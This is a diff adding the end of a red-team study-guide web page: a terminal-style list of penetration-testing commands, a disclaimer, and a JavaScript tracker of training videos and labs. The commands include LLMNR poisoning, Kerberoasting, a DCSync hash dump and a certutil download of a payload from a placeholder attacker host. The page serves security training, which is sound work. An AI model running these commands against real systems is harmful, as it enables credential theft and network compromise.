+      <div class="skill-level" style="color:var(--green)">SOLID ↑</div>
+    </div>
+  </div>
+
+  <hr class="divider">
+
+  <!-- TERMINAL TIPS -->
+  <div class="section-label">Operator Notes // Key Commands</div>
+
+  <div class="terminal-section">
+    <div class="terminal-line"><span class="prompt">root@kali:~#</span> <span class="cmd">nmap -sC -sV -p- --min-rate 5000 -oA full_scan 10.10.10.X</span> <span class="comment"># Full port scan, always save output</span></div>
+    <div class="terminal-line"><span class="output">→ Enumerate first. Every service, every port. Never assume. Document before you attack.</span></div>
+    <br>
+    <div class="terminal-line"><span class="prompt">root@kali:~#</span> <span class="cmd">gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/big.txt -x php,html,txt</span></div>
+    <div class="terminal-line"><span class="output">→ Brute-force every web service. Hidden paths = hidden attack surface. Include extensions.</span></div>
+    <br>
+    <div class="terminal-line"><span class="prompt">root@kali:~#</span> <span class="cmd">sudo responder -I eth0 -dwv</span> <span class="comment"># LLMNR/NBT-NS poisoning — AD initial access</span></div>
+    <div class="terminal-line"><span class="output">→ Run during business hours on an AD segment. Capture NTLMv2 hashes passively.</span></div>
+    <br>
+    <div class="terminal-line"><span class="prompt">root@kali:~#</span> <span class="cmd">python3 GetUserSPNs.py DOMAIN/user:pass -dc-ip DC_IP -request</span> <span class="comment"># Kerberoasting</span></div>
+    <div class="terminal-line"><span class="output">→ Request TGS for any SPN account. Crack the ticket offline with hashcat -m 13100.</span></div>
+    <br>
+    <div class="terminal-line"><span class="prompt">root@kali:~#</span> <span class="cmd">python3 secretsdump.py DOMAIN/admin:pass@DC_IP</span> <span class="comment"># DCSync — domain full compromise</span></div>
+    <div class="terminal-line"><span class="output">→ Dump all NTLM hashes once you have DCSync rights. Store in loot/. Document the chain.</span></div>
+    <br>
+    <div class="terminal-line"><span class="prompt">C:\&gt;</span> <span class="cmd">certutil -urlcache -split -f http://ATTACKER/payload.exe C:\Windows\Temp\p.exe</span></div>
+    <div class="terminal-line"><span class="output">→ certutil is a LOLBIN. Trusted by Windows, often allowed by AV. Classic file transfer technique.</span></div>
+    <br>
+    <div class="terminal-line"><span class="prompt">root@kali:~#</span> <span class="cmd">find / -perm -4000 -type f 2>/dev/null</span> <span class="comment"># SUID binary hunt — Linux PrivEsc</span></div>
+    <div class="terminal-line"><span class="output">→ Any SUID binary not expected? Check GTFOBins immediately. This is how 80% of CTF Linux boxes fall.</span></div>
+    <br>
+    <div class="terminal-line"><span class="warn">⚠  Rule: Stuck 2h → hint. Stuck 4h → walkthrough. But replay the box clean afterwards.</span></div>
+    <div class="terminal-line"><span class="warn">⚠  Document everything: screenshots, commands, output, timestamps. Build the habit for real engagements.</span></div>
+    <div class="terminal-line"><span class="warn">⚠  Never run tools against systems you don't own or have written permission to test.</span></div>
+    <br>
+    <div class="cursor-line"><span class="prompt">root@kali:~#</span> <div class="cursor"></div></div>
+  </div>
+
+  <!-- DISCLAIMER -->
+  <div class="warning-box">
+    All techniques covered in this guide are for educational use in authorized environments only.
+    Running any of these tools against systems you do not own or have explicit written permission to test is illegal.
+    Build your lab. Get written scope. Stay ethical.
+  </div>
+
+  <div class="footnote">
+    REDTEAM.GUIDE // FREE STACK MANUAL // v3.0 // FOR EDUCATIONAL USE IN AUTHORIZED ENVIRONMENTS ONLY
+    <br><br>
+    FREE CORE: HackerSploit · PortSwigger · OverTheWire · HTB · VulnHub · TCM Security · HackTricks · Antisyphon · TryHackMe · LOLBAS/GTFOBins · OST2
+    <br>
+    PAID COMPLETE STACK (~$640): JustHacking WMD1 (~$90) · White Knight Labs ARTOC (~$500) · Snap Labs (~$10)
+    <br>
+    REFERENCE: IppSec (YouTube) · PayloadsAllTheThings (GitHub) · Exploit-DB · Sliver C2 (docs.sliver.sh) · BloodHound (github.com/BloodHoundAD)
+  </div>
+
+</div><!-- /container -->
+
+<script>
+  // ── Skill bar animation ────────────────────────────────────────────
+  const fills = document.querySelectorAll('.skill-fill');
+  const observer = new IntersectionObserver((entries) => {
+    entries.forEach(entry => {
+      if (entry.isIntersecting) entry.target.style.animationPlayState = 'running';
+    });
+  }, { threshold: 0.3 });
+
+  fills.forEach(fill => {
+    fill.style.animationPlayState = 'paused';
+    observer.observe(fill);
+  });
+
+  // ── Glitch h1 ─────────────────────────────────────────────────────
+  const h1 = document.querySelector('h1');
+  setInterval(() => {
+    if (Math.random() < 0.05) {
+      h1.style.transform = `translate(${Math.random()*4-2}px, 0)`;
+      h1.style.filter = `hue-rotate(${Math.random()*30}deg)`;
+      setTimeout(() => { h1.style.transform = ''; h1.style.filter = ''; }, 80);
+    }
+  }, 500);
+
+  // ═══════════════════════════════════════════════════════════════════
+  // TRACKER (merged from pentest_study_guide)
+  // ═══════════════════════════════════════════════════════════════════
+  const YT  = 'https://www.youtube.com/watch?v=';
+  const PL  = 'https://www.youtube.com/playlist?list=';
+
+  const LINK_SVG = `<svg width="9" height="9" viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M5 2H2a1 1 0 0 0-1 1v7a1 1 0 0 0 1 1h7a1 1 0 0 0 1-1V7"/><path d="M8 1h3v3"/><line x1="11" y1="1" x2="5" y2="7"/></svg>`;
+
+  const hsData = [
+    {id:'p1',title:'PHASE 1 — Foundations',icon:'[01]',items:[
+      {id:'h1',text:'Penetration Testing — Introduction',links:[{l:'▶ Channel',u:'https://www.youtube.com/@HackerSploit'}]},
+      {id:'h2',text:'Infosec Terminology',links:[{l:'▶ YouTube',u:YT+'9fL7b9Wl1iM'}]},
+      {id:'h3',text:'CIA Triad',links:[{l:'▶ YouTube',u:YT+'0i2d8R8s7oA'}]},
+      {id:'h4',text:'Penetration Testing Terminology',links:[{l:'▶ YouTube',u:YT+'0SczKzxkHj4'}]},
+    ]},
+    {id:'p2',title:'PHASE 2 — Methodology',icon:'[02]',items:[
+      {id:'h5',text:'Penetration Testing Methodologies',links:[{l:'▶ YouTube',u:YT+'nyTlFA5Vanw'}]},
+    ]},
+    {id:'p3',title:'PHASE 3 — Lab Setup',icon:'[03]',items:[
+      {id:'h6',text:'Setting Up a Pentesting Lab',links:[{l:'▶ YouTube',u:YT+'7BXsaU42yok'}]},
+      {id:'h7',text:'Setup Terminal for Pentesting',links:[{l:'▶ YouTube',u:YT+'7nF2BAfWUEc'}]},
+      {id:'h8',text:'Create Your Own Pentesting Distro',links:[{l:'▶ YouTube',u:YT+'1dKQ1e0f6F4'}]},
+      {id:'h9',text:'Anonymize Traffic (Tor + Proxychains)',links:[{l:'▶ YouTube',u:YT+'6r1qH0X0b8I'}]},
+    ]},
+    {id:'p4',title:'PHASE 4 — Recon & OSINT',icon:'[04]',items:[
+      {id:'h10',text:'Information Gathering Overview',links:[{l:'▶ YouTube',u:YT+'0X6J8G3d9cA'}]},
+      {id:'h11',text:'Passive Info Gathering',links:[{l:'▶ YouTube',u:YT+'Qh7Z9K2k9xQ'}]},
+      {id:'h12',text:'Whois Lookup',links:[{l:'▶ YouTube',u:YT+'GJ4wZ2k8wZc'}]},
+      {id:'h13',text:'Email Harvesting (theHarvester)',links:[{l:'▶ YouTube',u:YT+'Q8p4S0nJz2E'}]},
+      {id:'h14',text:'OSINT with Maltego',links:[{l:'▶ YouTube',u:YT+'1oX2K7JwKzA'}]},
+      {id:'h15',text:'OSRFramework',links:[{l:'▶ YouTube',u:YT+'Fh8yW2p8X3E'}]},
+      {id:'h16',text:'Subdomain Enumeration (Sublist3r)',links:[{l:'▶ YouTube',u:YT+'0kV7v5p7W2o'}]},
+      {id:'h17',text:'Google Dorking',links:[{l:'▶ YouTube',u:YT+'7Y4kF1x0pQ8'}]},
+    ]},
+    {id:'p5',title:'PHASE 5 — DNS & Networking',icon:'[05]',items:[
+      {id:'h18',text:'DNS Enumeration & Zone Transfers',links:[{l:'▶ YouTube',u:YT+'9V8lR2Z0p5E'}]},
+      {id:'h19',text:'DNS Bruteforce (Fierce + Nmap)',links:[{l:'▶ YouTube',u:YT+'3uYpX7p8f3k'}]},
+      {id:'h20',text:'TCP Flags & Handshake',links:[{l:'▶ YouTube',u:YT+'2Qd5p6Z4F3M'}]},
+      {id:'h21',text:'TCP Handshake Explained',links:[{l:'▶ YouTube',u:YT+'4Xz8z9k7p3Q'}]},
+    ]},
+    {id:'p6',title:'PHASE 6 — Nmap (Core Skill)',icon:'[06]',items:[
+      {id:'h22',text:'Host Discovery',links:[{l:'▶ YouTube',u:YT+'GJ1k7k4w8Z0'}]},
+      {id:'h23',text:'OS & Service Detection',links:[{l:'▶ YouTube',u:YT+'1c4F2k8wZ7A'}]},
+      {id:'h24',text:'TCP Connect & SYN Scan',links:[{l:'▶ YouTube',u:YT+'5p3Z9F2X0kQ'}]},
+      {id:'h25',text:'UDP Scanning',links:[{l:'▶ YouTube',u:YT+'9p3F0Z8k2Qw'}]},
+      {id:'h26',text:'Output & Verbosity',links:[{l:'▶ YouTube',u:YT+'3F8k2Z9p0Qw'}]},
+      {id:'h27',text:'FIN / XMAS / NULL Scans',links:[{l:'▶ YouTube',u:YT+'7k2F0Z3p8Qw'}]},
+      {id:'h28',text:'Firewall Detection (ACK Scan)',links:[{l:'▶ YouTube',u:YT+'2k9F0Z8p3Qw'}]},
+      {id:'h29',text:'Firewall Evasion Techniques',links:[{l:'▶ YouTube',u:YT+'8p3F0Z2k9Qw'}]},
+    ]},
+    {id:'p7',title:'PHASE 7 — Next Steps',icon:'[07]',items:[
+      {id:'h30',text:'Nmap Full Beginner Series',links:[{l:'▶ YouTube',u:YT+'4t4kBkMsDbQ'}]},
+      {id:'h31',text:'Metasploit Basics',links:[{l:'▶ YouTube',u:YT+'0uvWRwU4bTg'}]},
+      {id:'h32',text:'Web App Pentesting Playlist',links:[{l:'▶ Playlist',u:PL+'PLBf0hzazHTGOEuhPQSnq-Ej8jRyXxfYvl'}]},
+    ]},
+    {id:'p8',title:'PHASE 8 — Practice Labs',icon:'[08]',items:[
+      {id:'h33',text:'TryHackMe — Beginner Rooms',links:[{l:'↗ TryHackMe',u:'https://tryhackme.com'}]},
+      {id:'h34',text:'Hack The Box — Starting Point',links:[{l:'↗ HackTheBox',u:'https://www.hackthebox.com'}]},
+      {id:'h35',text:'DVWA Setup & Exploitation',links:[{l:'↗ DVWA GitHub',u:'https://github.com/digininja/DVWA'}]},
+    ]},
+  ];
+
+  const psData = [
+    {id:'q0',title:'PHASE 0 — Absolute Beginner',icon:'[00]',items:[
+      {id:'p1b',text:'Server-Side Vulnerabilities Overview',tag:'core',links:[{l:'▶ YouTube',u:YT+'2_lswM1S264'},{l:'↗ PortSwigger',u:'https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice'}]},
+    ]},
+    {id:'q1',title:'PHASE 1 — Core Web Attacks',icon:'[01]',items:[
+      {id:'p2b',text:'SQL Injection',tag:'critical',links:[{l:'▶ Video 1',u:YT+'ciNHn38EyRc'},{l:'▶ Video 2',u:YT+'1nJg2Q8a6lA'},{l:'↗ Labs',u:'https://portswigger.net/web-security/sql-injection'}]},
+      {id:'p3b',text:'Cross-Site Request Forgery (CSRF)',links:[{l:'▶ YouTube',u:YT+'eWEgUcHPle0'},{l:'↗ Labs',u:'https://portswigger.net/web-security/csrf'}]},
+      {id:'p4b',text:'Cross-Origin Resource Sharing (CORS)',links:[{l:'▶ YouTube',u:YT+'Ka8vG5miErk'},{l:'↗ Labs',u:'https://portswigger.net/web-security/cors'}]},
+      {id:'p5b',text:'Clickjacking',links:[{l:'▶ YouTube',u:YT+'3mk8LZy9dZk'},{l:'↗ Labs',u:'https://portswigger.net/web-security/clickjacking'}]},
+      {id:'p6b',text:'Path Traversal',links:[{l:'▶ YouTube',u:YT+'9p6U7mZxZk0'},{l:'↗ Labs',u:'https://portswigger.net/web-security/file-path-traversal'}]},
+      {id:'p7b',text:'File Upload Vulnerabilities',tag:'critical',links:[{l:'▶ YouTube',u:YT+'8tG8rRO8Z8g'},{l:'↗ Labs',u:'https://portswigger.net/web-security/file-upload'}]},
+    ]},
+    {id:'q2',title:'PHASE 2 — Auth & Access Control',icon:'[02]',items:[
+      {id:'p8b',text:'Authentication Vulnerabilities',tag:'critical',links:[{l:'▶ YouTube',u:YT+'2nVZkz9F0rU'},{l:'↗ Labs',u:'https://portswigger.net/web-security/authentication'}]},
+      {id:'p9b',text:'API Testing',tag:'core',links:[{l:'▶ YouTube',u:YT+'Gv9_4yMHFhI'},{l:'↗ Labs',u:'https://portswigger.net/web-security/api-testing'}]},
+      {id:'p10b',text:'GraphQL Vulnerabilities',links:[{l:'▶ YouTube',u:YT+'Z2zWz9eZp8A'},{l:'↗ Labs',u:'https://portswigger.net/web-security/graphql'}]},
+    ]},
+    {id:'q3',title:'PHASE 3 — Advanced Server-Side',icon:'[03]',items:[
+      {id:'p11b',text:'SSRF (Server-Side Request Forgery)',tag:'critical',links:[{l:'▶ YouTube',u:YT+'YWHB9z4P3p4'},{l:'↗ Labs',u:'https://portswigger.net/web-security/ssrf'}]},
+      {id:'p12b',text:'NoSQL Injection',links:[{l:'▶ YouTube',u:YT+'KqLZV3G7pZk'},{l:'↗ Labs',u:'https://portswigger.net/web-security/nosql-injection'}]},
+      {id:'p13b',text:'Race Conditions',links:[{l:'▶ YouTube',u:YT+'7Z4l5k8F0pQ'},{l:'↗ Labs',u:'https://portswigger.net/web-security/race-conditions'}]},
+      {id:'p14b',text:'Web Cache Deception',links:[{l:'▶ YouTube',u:YT+'Z3n6wJ0p7Qk'},{l:'↗ Labs',u:'https://portswigger.net/web-security/web-cache-deception'}]},
+    ]},
+    {id:'q4',title:'PHASE 4 — Modern Attack Surface',icon:'[04]',items:[
+      {id:'p15b',text:'WebSockets Vulnerabilities',links:[{l:'▶ YouTube',u:YT+'V9sWhnYQp8E'},{l:'↗ Labs',u:'https://portswigger.net/web-security/websockets'}]},
+      {id:'p16b',text:'Prototype Pollution',links:[{l:'▶ YouTube',u:YT+'6bR7qF0kQpA'},{l:'↗ Labs',u:'https://portswigger.net/web-security/prototype-pollution'}]},
+      {id:'p17b',text:'Web LLM Attacks (Prompt Injection)',tag:'core',links:[{l:'▶ YouTube',u:YT+'VqCkCDFLSsc'},{l:'↗ Labs',u:'https://portswigger.net/web-security/llm-attacks'}]},
+    ]},
+    {id:'q5',title:'PHASE 5 — Essential Tooling',icon:'[05]',items:[
+      {id:'p18b',text:'Burp Suite — Proxy & Intercept',tag:'critical',links:[{l:'▶ YouTube',u:YT+'2H7Q0t2J9c8'},{l:'↗ Download',u:'https://portswigger.net/burp/communitydownload'}]},
+      {id:'p19b',text:'Burp Suite — Repeater & Intruder',links:[{l:'▶ YouTube',u:YT+'2H7Q0t2J9c8'},{l:'↗ Docs',u:'https://portswigger.net/burp/documentation'}]},
+      {id:'p20b',text:'Burp Suite — Scanner',links:[{l:'↗ Docs',u:'https://portswigger.net/burp/documentation/scanner'}]},
+    ]},
+    {id:'q6',title:'PHASE 6 — Practice Labs',icon:'[06]',items:[
+      {id:'p21b',text:'PortSwigger SQL Injection Labs',links:[{l:'↗ Labs',u:'https://portswigger.net/web-security/sql-injection'}]},
+      {id:'p22b',text:'PortSwigger Authentication Labs',links:[{l:'↗ Labs',u:'https://portswigger.net/web-security/authentication'}]},
+      {id:'p23b',text:'PortSwigger SSRF Labs',links:[{l:'↗ Labs',u:'https://portswigger.net/web-security/ssrf'}]},
+      {id:'p24b',text:'PortSwigger XSS Labs',links:[{l:'↗ Labs',u:'https://portswigger.net/web-security/cross-site-scripting'}]},
+      {id:'p25b',text:'PortSwigger File Upload Labs',links:[{l:'↗ Labs',u:'https://portswigger.net/web-security/file-upload'}]},
+    ]},
+  ];
+
+  // ── State ──────────────────────────────────────────────────────────
+  let state = {};
+  let openPhases = {};
+  let trackerOpen = { hs: false, ps: false };
+
+  function load() {
+    try { state = JSON.parse(localStorage.getItem('redteam_guide_v1') || '{}'); } catch(e) { state = {}; }
+  }
+  function save() {
+    try { localStorage.setItem('redteam_guide_v1', JSON.stringify(state)); } catch(e) {}
+  }
+
+  // ── Toggle tracker panel ───────────────────────────────────────────
+  function toggleTracker(prefix) {
+    trackerOpen[prefix] = !trackerOpen[prefix];
+    const body = document.getElementById(prefix + '-tracker-body');
+    const arr  = document.getElementById(prefix + '-toggle-arr');
+    if (body) body.className = 'tracker-body' + (trackerOpen[prefix] ? ' open' : '');
+    if (arr)  arr.textContent = trackerOpen[prefix] ? '▼' : '▶';
+  }
+
+  // ── Toggle phase collapse ──────────────────────────────────────────
+  function togglePhase(pid, prefix) {
+    const key = prefix + '_' + pid;
+    openPhases[key] = !openPhases[key];
+    const el  = document.getElementById('t-items_' + prefix + '_' + pid);
+    const arr = document.getElementById('t-arr_'   + prefix + '_' + pid);
+    if (el)  el.className  = 't-items'  + (openPhases[key] ? ' open' : '');
+    if (arr) arr.textContent = openPhases[key] ? '▼' : '▶';
+  }
+
+  // ── Toggle item ────────────────────────────────────────────────────
+  function toggleItem(id, e) {
+    if (e && e.target.closest('a')) return;
+    state[id] = !state[id];
+    save();
+    renderAll();
+  }
+
+  // ── Reset ──────────────────────────────────────────────────────────
+  function resetTracker(prefix) {
+    const data = prefix === 'hs' ? hsData : psData;
+    if (!confirm('Reset ' + prefix.toUpperCase() + ' progress? Cannot be undone.')) return;
+    data.forEach(ph => ph.items.forEach(it => { delete state[it.id]; }));
+    save();
+    renderAll();
+  }
+
+  // ── Render links ───────────────────────────────────────────────────
+  function renderLinks(links) {
+    if (!links || !links.length) return '';
+    return `<div class="t-links">${links.map(l =>
+      `<a class="t-link-btn" href="${l.u}" target="_blank" rel="noopener" onclick="event.stopPropagation()">${LINK_SVG} ${l.l}</a>`
+    ).join('')}</div>`;
+  }
+
+  // ── Render one tracker ─────────────────────────────────────────────
+  function renderTracker(containerId, data, prefix) {
+    const cont = document.getElementById(containerId);
+    if (!cont) return;
+
+    const allItems = data.flatMap(p => p.items);
+    const total    = allItems.length;
+    const done     = allItems.filter(i => state[i.id]).length;
+    const pct      = total ? Math.round(done / total * 100) : 0;
+
+    let html = `<div class="t-overall-bar">
+      <div class="t-bar-label"><span>OVERALL PROGRESS</span><span>${done} / ${total} — ${pct}%</span></div>
+      <div class="t-bar-track"><div class="t-bar-fill" style="width:${pct}%"></div></div>
+    </div>`;
+
+    data.forEach(phase => {
+      const pdone  = phase.items.filter(i => state[i.id]).length;
+      const ptotal = phase.items.length;
+      const ppct   = ptotal ? Math.round(pdone / ptotal * 100) : 0;
+      const key    = prefix + '_' + phase.id;
+      const isOpen = !!openPhases[key];
+
+      html += `<div class="t-phase">
+        <div class="t-phase-header" onclick="togglePhase('${phase.id}','${prefix}')">
+          <span class="t-phase-icon">${phase.icon}</span>
+          <span class="t-phase-title">${phase.title}</span>
+          <div class="t-phase-mini-bar"><div class="t-phase-mini-fill" style="width:${ppct}%"></div></div>
+          <span class="t-phase-count" style="color:${ppct===100?'var(--green)':'var(--muted)'}">${pdone}/${ptotal}</span>
+          <span class="t-arr" id="t-arr_${prefix}_${phase.id}">${isOpen?'▼':'▶'}</span>
+        </div>
+        <div class="t-items${isOpen?' open':''}" id="t-items_${prefix}_${phase.id}">`;
+
+      phase.items.forEach(item => {
+        const checked = !!state[item.id];
+        html += `<div class="t-item${checked?' done':''}" onclick="toggleItem('${item.id}',event)">
+          <div class="t-checkbox${checked?' checked':''}">${checked?'✓':''}</div>
+          <div class="t-item-body">
+            <div class="t-item-label">
+              <span class="t-item-text">${item.text}</span>
+              ${item.tag==='critical'?'<span class="t-item-tag t-tag-critical">CRITICAL</span>':''}
+              ${item.tag==='core'?'<span class="t-item-tag t-tag-core">CORE</span>':''}
+            </div>
+            ${renderLinks(item.links)}
+          </div>
+        </div>`;
+      });
+
+      html += `</div></div>`;
+    });
+
+    cont.innerHTML = html;
+
+    // update mini stat in toggle bar
+    const miniStat = document.getElementById(prefix + '-mini-stat');
+    if (miniStat) miniStat.textContent = `${done}/${total}`;
+  }
+
+  function renderAll() {
+    renderTracker('hs-tracker', hsData, 'hs');
+    renderTracker('ps-tracker', psData, 'ps');
+  }
+
+  load();
+  renderAll();
+</script>
+</body>
+</html>
